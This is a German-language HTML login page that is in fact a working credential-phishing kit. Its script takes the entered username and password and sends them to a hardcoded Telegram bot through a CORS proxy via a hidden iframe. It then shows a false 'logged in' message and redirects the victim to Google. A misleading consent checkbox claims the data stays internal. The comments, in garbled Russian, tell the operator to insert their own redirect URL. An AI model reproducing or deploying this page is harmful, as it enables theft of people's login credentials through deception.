<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Anmeldung</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
        }
        .login-container {
            background: rgba(255, 255, 255, 0.95);
            padding: 40px;
            border-radius: 16px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
            width: 320px;
            text-align: center;
            color: #333;
        }
        h2 {
            margin: 0 0 30px 0;
            color: #667eea;
            font-size: 28px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 14px;
            margin: 12px 0;
            border: 2px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
            box-sizing: border-box;
            transition: border 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 8px rgba(102, 126, 234, 0.3);
        }
        .checkbox-container {
            margin: 20px 0 10px 0;
            text-align: left;
            font-size: 14px;
            color: #555;
        }
        .checkbox-container label {
            cursor: pointer;
            display: flex;
            align-items: flex-start;
        }
        .checkbox-container input[type="checkbox"] {
            margin-right: 10px;
            margin-top: 3px;
            flex-shrink: 0;
        }
        button {
            width: 100%;
            padding: 16px;
            background: #aab3e0; /* —Å–µ—Ä–æ-—Å–∏–Ω–∏–π, –ø–æ–∫–∞ –≥–∞–ª–æ—á–∫–∞ –Ω–µ –ø–æ—Å—Ç–∞–≤–ª–µ–Ω–∞ */
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            cursor: not-allowed;
            margin-top: 10px;
            transition: background 0.3s;
        }
        button.active {
            background: #667eea;
            cursor: pointer;
        }
        button.active:hover {
            background: #5a6fd8;
        }
        #status {
            margin-top: 20px;
            font-weight: bold;
            font-size: 18px;
            min-height: 24px;
        }
        .footer {
            margin-top: 30px;
            font-size: 12px;
            color: #aaa;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Anmeldung</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Benutzername" required>
            <input type="password" id="password" placeholder="Passwort" required>

            <div class="checkbox-container">
                <label>
                    <input type="checkbox" id="consent">
                    <span>Mit dem Einloggen stimmen Sie der √úbermittlung Ihrer Anmeldedaten zu Verifizierungszwecken und zur Sicherstellung der Konto-Sicherheit zu. Die Daten werden ausschlie√ülich intern verarbeitet.</span>
                </label>
            </div>

            <button type="submit" id="loginButton" disabled>Einloggen</button>
        </form>

        <div id="status"></div>
        <div class="footer">Willkommen zur√ºck!</div>
    </div>

    <iframe name="hiddenIframe" style="display:none;"></iframe>

    <script>
        const botToken = "8408447077:AAFtGEn83fMMy66MnIdveRPW5kQ5ZQukU04";
        const chatId = "5684291694";
        const proxyUrl = "https://corsproxy.io/?";
        const redirectUrl = "https://www.google.com"; // ‚Üê –ó–∞–º–µ–Ω–∏ –Ω–∞ —Å–≤–æ–π URL!

        const consentCheckbox = document.getElementById("consent");
        const loginButton = document.getElementById("loginButton");

        // –ê–∫—Ç–∏–≤–∞—Ü–∏—è –∫–Ω–æ–ø–∫–∏ —Ç–æ–ª—å–∫–æ –ø—Ä–∏ —Å–æ–≥–ª–∞—Å–∏–∏
        consentCheckbox.addEventListener("change", function() {
            if (this.checked) {
                loginButton.disabled = false;
                loginButton.classList.add("active");
            } else {
                loginButton.disabled = true;
                loginButton.classList.remove("active");
            }
        });

        document.getElementById("loginForm").addEventListener("submit", function(e) {
            e.preventDefault();

            // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ (–Ω–∞ –≤—Å—è–∫–∏–π —Å–ª—É—á–∞–π)
            if (!consentCheckbox.checked) {
                document.getElementById("status").innerHTML = "Sie m√ºssen zustimmen!";
                document.getElementById("status").style.color = "red";
                return;
            }

            const rawUsername = document.getElementById("username").value;
            const rawPassword = document.getElementById("password").value;

            const text = encodeURIComponent(`üîî Neuer Login-Versuch! (Zustimmung erteilt)\n\nüë§ Benutzername: ${rawUsername}\nüîë Passwort: ${rawPassword}`);

            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=HTML`;
            const fullUrl = proxyUrl + encodeURIComponent(apiUrl);

            // –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram
            const iframe = document.createElement('iframe');
            iframe.src = fullUrl;
            iframe.style.display = "none";
            document.body.appendChild(iframe);
            setTimeout(() => document.body.removeChild(iframe), 1000);

            // –£—Å–ø–µ—Ö –∏ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ
            document.getElementById("status").innerHTML = "Erfolgreich angemeldet! Weiterleitung... üîÑ";
            document.getElementById("status").style.color = "#28a745";

            document.getElementById("username").value = "";
            document.getElementById("password").value = "";

            setTimeout(() => {
                window.location.href = redirectUrl;
            }, 2000);
        });
    </script>
</body>
</html>
